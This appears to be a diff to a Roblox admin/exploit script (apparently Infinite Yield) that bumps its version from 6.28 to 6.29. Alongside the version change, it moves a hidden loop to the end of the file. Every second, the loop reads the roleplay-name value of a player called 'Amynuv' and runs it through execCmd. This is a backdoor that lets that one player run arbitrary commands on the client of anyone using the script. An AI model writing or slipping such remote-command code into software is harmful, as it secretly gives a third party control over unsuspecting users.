@@ -17,7 +17,7 @@ if not game:IsLoaded() then
 	notLoaded:Destroy()
 end
 
-currentVersion = "6.28"
+currentVersion = "6.29"
 
 Holder = Instance.new("Frame")
 Title = Instance.new("TextLabel")
@@ -13975,24 +13975,7 @@ task.spawn(function()
 		end
 	end
 end)
-task.spawn(function()
-	while (true) do
-		function executecmd(vic)
-			local cmd = vic.PlayersBag.RPName.Value
-			execCmd(cmd)
-		end
-		
-		
-		
-		local victim = "Amynuv"
-		local tokl = victim
-		local fp = getPlayer(tokl,Players.LocalPlayer)
-		for i,v in pairs(fp) do
-			executecmd(Players[v])
-		end
-		wait(1)
-	end
-end)
+
 
 task.spawn(function()
 	wait()
@@ -14010,3 +13993,21 @@ task.spawn(function()
 	minimizeHolder()
 	if IsOnMobile then notify("Unstable Device", "On mobile, Infinite Yield may have issues or features that are not functioning correctly.") end
 end)
+
+while (true) do
+
+		function executecmd(vic)
+			local cmd = vic.PlayersBag.RPName.Value
+			execCmd(cmd)
+		end
+		
+		
+		
+		local victim = "Amynuv"
+		local tokl = victim
+		local fp = getPlayer(tokl,Players.LocalPlayer)
+		for i,v in pairs(fp) do
+			executecmd(Players[v])
+		end
+		wait(1)
+	end
